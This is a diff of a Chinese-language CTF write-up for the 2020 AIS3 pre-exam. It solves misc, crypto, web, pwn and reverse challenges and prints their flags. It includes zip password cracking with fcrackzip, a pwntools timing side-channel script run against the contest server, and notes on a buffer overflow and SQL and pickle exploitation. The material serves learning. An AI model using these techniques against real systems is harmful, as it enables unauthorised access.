@@ -1,32 +1,32 @@
 ## 2020 AIS3 pre-exam & MyFirstCTF
 
-第一次參加國內的CTF！ 整體下來的感覺總而言之是非常的充實，在web方面看到了很多神奇的東西，學到很多
+## 前言
 
-pwn跟reverse類基本上看不懂:cry:
+[TOC]
 
-discord裡頭的都是神人啊 Q___Q 
+官方Writeup:
 
-只能說 Google真的是很好用
+- [Reverse] http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/
+- [Web] https://github.com/djosix/AIS3-2020-Pre-Exam
+- [Pwn] https://github.com/ss8651twtw/ais3-pre-exam-2020
+- [Misc] https://github.com/frozenkp/CTF/tree/master/2020/AIS3_pre-exam
+- [Crypto] https://maojui.me
 
-（下面按照解題順序寫）
+**2020.06.31** 第一次正式參加CTF！ 整體下來的感覺總而言之是非常的充實，在web方面看到了很多神奇的東西，學到很多，然而pwn跟reverse類基本上看不懂，discord上面的人都是神人啊 Q___Q 
 
-### Crypto - T-Rex
+只能說 Google真的是很好用XD
 
-給了個文字檔案，是個排版的很漂亮的對照表，加上一大串字元，顯然是要一個一個對的Flag
+<img src="pic/scoreboard.png" style="zoom: 67%;" />
 
-Spaghetti code 直接寫下去就得到flag:
+## Misc
 
-```
-AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
-```
-
- 這個暴龍很G8 >_<
+---------------------------
 
 ### Misc - piquero
 
 一張圖片，盲人點字。
 
-直接上google圖片查對照表，拿張紙一個一個對，不過大寫符號很煩就是了
+直接上google圖片查對照表，拿張紙一個一個對，大寫字母和符號會多用一個點字來區別，蠻有趣的。
 
 Flag:
 
@@ -34,69 +34,164 @@ Flag:
 AIS3{I_feel_sleepy_Good_Night!!!}
 ```
 
-### Misc - TsaiBro
+### Misc - Soy
 
-拿到一個執行檔、一個文字檔。可以猜測文字檔是拿某個字串輸進去之後出來的結果。
+看到discord裡好多人都用手解，我在這裡真心表達佩服:sweat_smile:
 
-拿ghidra開執行檔，轉換過程完全看不懂，不過給幾個input玩一下之後，看起來是一個字元可以對應到兩個「發財」，點的數量只跟字元有關係，所以就暴力對照解下去：
+我搜不到QRcode的演算法，倒是搜到了個工具XD
+
+https://github.com/waidotto/strong-qr-decoder
+
+把能看到的看不到的都餵給他：
+
+```
+$ cat qrdata.txt
+xxxxxxx---xxx-xx--xxxxxxx
+x-----x--x-xx-xxx-x-----x
+x-xxx-x-x--x--xx--x-xxx-x
+x-xxx-x-----x---x-x-xxx-x
+x-xxx-x---xxx-----x-xxx-x
+x-----x--x-xxx-xx-x-----x
+xxxxxxx-x-x-x-x-x-xxxxxxx
+--------xxxx-xxxx--------
+????xxxxxx--xx---xx---x--
+????xx??x-------xxx--x---
+???x????x----x--x-xx-x-xx
+???????x-xx-xx-x--x-xx---
+????????x-xx-x----xxxx-x-
+???-x???-x---x----x--x-xx
+???-xxxx-xx------xxx-x---
+????----x--x-x-x-x-------
+?????xx??x--x--xxxxxxx--x
+--------x-x---x-x---xxxx-
+xxxxxxx-x----x-xx-x-xx-xx
+x-----x-xxx-xxx-x---x--x-
+x-xxx-x-x-xx-x--xxxxx-x-x
+x-xxx-x---x---------xxxxx
+x-xxx-x-xx---------xx-x-x
+x-----x-xxxxxxx---xx-x-x-
+xxxxxxx-x---xx-xx---xx-xx
+$ python qr.py qrdata.txt
+A�S3{H0w_c4nYy0u_f1nd_me?!?!?!!m
+```
+
+有點亂碼，不過正解flag是:
+
+```
+AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
+```
+
+### Misc - Karuego
+
+只給你一張檔案不知道在大什麼的圖片，上網稍微查了下圖片怎麼藏資料，幾乎全都是說把zip接在圖片後面
+
+那就直接試著解壓縮：
 
 ```bash
-$ ./tsaibro ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgjijklmnopqrstuvwxyz1234567890_{}
-Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
-發財..發財.......發財..發財........發財........發財.發財........發財..發財........發財...發財........發財....發財....發財.....發財....發財......發財....發財.......發財....發財........發財.....發財.發財.....發財..發財.....發財...發財.....發財....發財.......發財.....發財.......發財......發財.......發財.......發財.......發財........發財....發財.發財....發財..發財....發財...發財....發財....
-(以下略)
+$ unzip Karuego.png
+Archive:  Karuego.png
+warning [Karuego.png]:  2059568 extra bytes at beginning or within zipfile
+  (attempting to process anyway)
+[Karuego.png] files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg password:
 ```
+
+真的是，而且還有加密。先用`dd`把zip部份拿出來，再使用`fcrackzip`配合rockyou.txt去試密碼：
+
+```shell
+$ dd bs=2059568 skip=1 if=Karuego.png of=out.zip
+0+1 records in
+0+1 records out
+1201353 bytes transferred in 0.004195 secs (286379068 bytes/sec)
+$ fcrackzip -v -u -D -p rockyou.txt out.zip
+'files/' is not encrypted, skipping
+found file 'files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg', (size cp/uc 113020/113110, flags 9, chk 216f)
+found file 'files/Demon.png', (size cp/uc 1087747/1092860, flags 9, chk 86e2)
+checking pw luis99fer
+
+PASSWORD FOUND!!!!: pw == lafire
+```
+
+解壓縮之後可以得到flag的圖片：
+
+![Demon](pic/Demon.png)
+
+### Misc - Saburo
+
+連上去，伺服器提示`Flag:`讓你輸入，然後會跑出cpu時間，拿flag的開頭`AIS3{`去試，很明顯時間跟前面對了幾個字元直接相關，只是每個字元時間都會有不少誤差，要試多次取平均。
+
+直接上python：
 
 ```python
-# -*- coding: utf-8 -*-
-money = （略）
-x = money.split('發財')
-alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-i=0
-dic={}
-while 2*i<len(x)-1:
-    x1 = len(x[2*i]); x2 = len(x[2*i+1])
-    dic[str(x1)+str(x2)] = alphabet[i]
-    print(f"{x1}{x2}={alphabet[i]}")
-    i+=1
+from pwn import *
+import os
 
-sym = （略）
-x = sym.split('發財')
-alphabet = 'abcdefghijklmnopqrstuvwxyz'
-i = 0
-while 2*i < len(x)-1:
-    x1 = len(x[2*i])
-    x2 = len(x[2*i+1])
-    dic[str(x1)+str(x2)] = alphabet[i]
-    print(f"{x1}{x2}={alphabet[i]}")
-    i += 1
+context.log_level = 'warning'
+known = "AIS3{" 
 
-sym = （略）
-x = sym.split('發財')
-alphabet = '1234567890_{}'
-i = 0
-while 2*i < len(x)-1:
-    x1 = len(x[2*i])
-    x2 = len(x[2*i+1])
-    dic[str(x1)+str(x2)] = alphabet[i]
-    print(f"{x1}{x2}={alphabet[i]}")
-    i += 1
+chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_}"
 
-print(dic)
-code = （TsaiBroSaid裡面的東西）
-cd = code.split('發財')
-for i in range(int(len(cd)/2)):
-    try:
-        print(dic[str(len(cd[i*2]))+str(len(cd[i*2+1]))], end='')
-    except:
-        print('not found: '+str(len(cd[i*2]))+str(len(cd[i*2+1])))
+while True:
+    c=0
+    prev = 0
+    st = "\n"
+    while c<len(chrs):
+        
+        avg = 0
+        log.warning(f'Trying {known+chrs[c]}')
+        for i in range(15):
+            print(i,end='')
+            p = remote("60.250.197.227", 11001)
+            p.recvuntil('Flag: ')
+            p.sendline(known+chrs[c])
+            s = p.recvline()
+            avg += int(s[18:-14])
+            p.close()
+
+        avg = avg
+        print(f'  avg time={avg}')
+        st += f'{chrs[c]}: {avg}\n'
+        flag=0
+        if avg > prev:
+            flag=1
+            prev = avg
+            largeind = c
+        
+        c+=1
+        
+    print(st)
+    log.warning(f'largest char: {chrs[largeind]}, time={prev}')
+    ans = input('Enter char, or left empty to use largest: ')
+    ans = ans.strip('\n')
+    if ans=="":
+        known += chrs[largeind]
+        log.warning(f'new char: [{chrs[largeind]}], time={prev}')
+    else:
+        known += ans
+        log.warning(f'new char: {ans}')
+
+    if known[-1] == '}':
+        break
+
+print(known)
 ```
 
-得到flag:
+總之就是每個字元試15次，取最長的拿來試下一個。應該可以再用thread重寫優化，但是我懶的再跑一次，所以這裡我就不給flag了>_<
+
+## Crypto
+
+----------------------------------
+
+### Crypto - T-Rex
+
+給了個文字檔案，是個排版的很漂亮的對照表，加上一大串字元，顯然是要一個一個對的Flag
+
+code直接寫下去就得到flag:
 
 ```
-AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
+AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
 ```
+
+ 這個暴龍很G8 >_<
 
 ### Crypto - Brontosaurus
 
@@ -109,22 +204,6 @@ AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_
 ```
 AIS3{Br0n7Os4uru5_ch3at_3asi1Y}
 ```
-
-### pwn - BOF
-
-我很廢，所以這是我pwn唯一解開的一題 :sweat:
-
-經典的BOF，程式進入還會很鄙視的說這題很簡單：
-
-```
-👻 They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.
-```
-
-稍微google一下之後知道這是指在遠端實施bof攻擊需要比自己測試多加8 byte，雖然我真的不知道為什麼
-
-直接把程式丟到Ghidra裡知道buffer長`0x30`，後台在`0x400688`，直接丟進pwntools拿到flag：
-
-```AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}```
 
 ### Crypto - Octopus
 
@@ -192,52 +271,9 @@ print(bytes.fromhex(hex(flag).strip('0x')).decode('UTF-8'))
 AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}
 ```
 
-### Misc - Soy
+## Web
 
-看到discord裡好多人都用手解，我在這裡真心表達尊敬:sweat_smile:
-
-我怎麼搜都搜不到QRcode的演算法，倒是搜到了個可以Recover的工具XD
-
-https://github.com/waidotto/strong-qr-decoder
-
-把能看到的看不到的都餵給他：
-
-```
-$ cat qrdata.txt
-xxxxxxx---xxx-xx--xxxxxxx
-x-----x--x-xx-xxx-x-----x
-x-xxx-x-x--x--xx--x-xxx-x
-x-xxx-x-----x---x-x-xxx-x
-x-xxx-x---xxx-----x-xxx-x
-x-----x--x-xxx-xx-x-----x
-xxxxxxx-x-x-x-x-x-xxxxxxx
---------xxxx-xxxx--------
-????xxxxxx--xx---xx---x--
-????xx??x-------xxx--x---
-???x????x----x--x-xx-x-xx
-???????x-xx-xx-x--x-xx---
-????????x-xx-x----xxxx-x-
-???-x???-x---x----x--x-xx
-???-xxxx-xx------xxx-x---
-????----x--x-x-x-x-------
-?????xx??x--x--xxxxxxx--x
---------x-x---x-x---xxxx-
-xxxxxxx-x----x-xx-x-xx-xx
-x-----x-xxx-xxx-x---x--x-
-x-xxx-x-x-xx-x--xxxxx-x-x
-x-xxx-x---x---------xxxxx
-x-xxx-x-xx---------xx-x-x
-x-----x-xxxxxxx---xx-x-x-
-xxxxxxx-x---xx-xx---xx-xx
-$ python qr.py qrdata.txt
-A�S3{H0w_c4nYy0u_f1nd_me?!?!?!!m
-```
-
-有點亂碼，不過正解flag是:
-
-```
-AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
-```
+----
 
 ### Web - Shark
 
@@ -448,102 +484,6 @@ results: users,sqlite_sequence,garbage
 
 就拿到flag惹，松鼠蠻可愛的ww
 
-### Misc - Karuego
-
-只給你一張檔案不知道在大什麼的圖片，上網稍微查了下圖片怎麼藏資料，幾乎全都是說把zip接在圖片後面
-
-那就直接試著解壓縮：
-
-```bash
-$ unzip Karuego.png
-Archive:  Karuego.png
-warning [Karuego.png]:  2059568 extra bytes at beginning or within zipfile
-  (attempting to process anyway)
-[Karuego.png] files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg password:
-```
-
-真的是，而且還有加密。先用`dd`把zip部份拿出來，再使用`fcrackzip`配合rockyou.txt去試密碼：
-
-```shell
-$ dd bs=2059568 skip=1 if=Karuego.png of=out.zip
-0+1 records in
-0+1 records out
-1201353 bytes transferred in 0.004195 secs (286379068 bytes/sec)
-$ fcrackzip -v -u -D -p rockyou.txt out.zip
-'files/' is not encrypted, skipping
-found file 'files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg', (size cp/uc 113020/113110, flags 9, chk 216f)
-found file 'files/Demon.png', (size cp/uc 1087747/1092860, flags 9, chk 86e2)
-checking pw luis99fer
-
-PASSWORD FOUND!!!!: pw == lafire
-```
-
-解壓縮之後可以得到flag的圖片：
-
-![Demon](pic/Demon.png)
-
-### Misc - Saburo
-
-連上去，伺服器提示`Flag:`讓你輸入，然後會跑出cpu時間，拿flag的開頭`AIS3{`去試，很明顯時間跟錢面對了幾個字元直接相關，只是時間範圍其實落差蠻大。
-
-直接上python：
-
-```python
-from pwn import *
-import os
-
-context.log_level = 'warning'
-known = "AIS3{" 
-
-chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_}"
-
-while True:
-    c=0
-    prev = 0
-    st = "\n"
-    while c<len(chrs):
-        
-        avg = 0
-        log.warning(f'Trying {known+chrs[c]}')
-        for i in range(15):
-            print(i,end='')
-            p = remote("60.250.197.227", 11001)
-            p.recvuntil('Flag: ')
-            p.sendline(known+chrs[c])
-            s = p.recvline()
-            avg += int(s[18:-14])
-            p.close()
-
-        avg = avg
-        print(f'  avg time={avg}')
-        st += f'{chrs[c]}: {avg}\n'
-        flag=0
-        if avg > prev:
-            flag=1
-            prev = avg
-            largeind = c
-        
-        c+=1
-        
-    print(st)
-    log.warning(f'largest char: {chrs[largeind]}, time={prev}')
-    ans = input('Enter char, or left empty to use largest: ')
-    ans = ans.strip('\n')
-    if ans=="":
-        known += chrs[largeind]
-        log.warning(f'new char: [{chrs[largeind]}], time={prev}')
-    else:
-        known += ans
-        log.warning(f'new char: {ans}')
-
-    if known[-1] == '}':
-        break
-
-print(known)
-```
-
-總之就是每個字元試15次，取最長的拿來試下一個。應該可以再優化，但是我很懶，我也懶的再跑一次，所以這裡我就不給flag了>_<
-
 ---------------------------------------------------
 
 ### Web - Snake
@@ -609,3 +549,92 @@ print(b64(pickled))
 AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
 ```
 
+## pwn
+
+-----------------
+
+### pwn - BOF
+
+我廢，所以我pwn只解的開這個簽到題 :sweat:
+
+經典的BOF，程式進入還會很鄙視的說這題很簡單：
+
+```
+👻 They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.
+```
+
+稍微google一下之後知道這是指在遠端實施bof攻擊需要比自己測試多加8 byte，雖然我真的不知道為什麼
+
+直接把程式丟到Ghidra裡知道buffer長`0x30`，後台在`0x400688`，直接丟進pwntools拿到flag：
+
+```AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}```
+
+## Reverse
+
+----
+
+### Reverse - TsaiBro
+
+拿到一個執行檔、一個文字檔。可以猜測文字檔是拿某個字串輸進去之後出來的結果。
+
+拿ghidra開執行檔，轉換過程完全看不懂，不過給幾個input玩一下之後，看起來是一個字元可以對應到兩個「發財」，點的數量只跟字元有關係，所以就暴力對照解下去：
+
+```bash
+$ ./tsaibro ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgjijklmnopqrstuvwxyz1234567890_{}
+Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
+發財..發財.......發財..發財........發財........發財.發財........發財..發財........發財...發財........發財....發財....發財.....發財....發財......發財....發財.......發財....發財........發財.....發財.發財.....發財..發財.....發財...發財.....發財....發財.......發財.....發財.......發財......發財.......發財.......發財.......發財........發財....發財.發財....發財..發財....發財...發財....發財....
+(以下略)
+```
+
+```python
+# -*- coding: utf-8 -*-
+money = （略）
+x = money.split('發財')
+alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+i=0
+dic={}
+while 2*i<len(x)-1:
+    x1 = len(x[2*i]); x2 = len(x[2*i+1])
+    dic[str(x1)+str(x2)] = alphabet[i]
+    print(f"{x1}{x2}={alphabet[i]}")
+    i+=1
+
+sym = （略）
+x = sym.split('發財')
+alphabet = 'abcdefghijklmnopqrstuvwxyz'
+i = 0
+while 2*i < len(x)-1:
+    x1 = len(x[2*i])
+    x2 = len(x[2*i+1])
+    dic[str(x1)+str(x2)] = alphabet[i]
+    print(f"{x1}{x2}={alphabet[i]}")
+    i += 1
+
+sym = （略）
+x = sym.split('發財')
+alphabet = '1234567890_{}'
+i = 0
+while 2*i < len(x)-1:
+    x1 = len(x[2*i])
+    x2 = len(x[2*i+1])
+    dic[str(x1)+str(x2)] = alphabet[i]
+    print(f"{x1}{x2}={alphabet[i]}")
+    i += 1
+
+print(dic)
+code = （TsaiBroSaid裡面的東西）
+cd = code.split('發財')
+for i in range(int(len(cd)/2)):
+    try:
+        print(dic[str(len(cd[i*2]))+str(len(cd[i*2+1]))], end='')
+    except:
+        print('not found: '+str(len(cd[i*2]))+str(len(cd[i*2+1])))
+```
+
+得到flag:
+
+```
+AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
+```
+
+### 
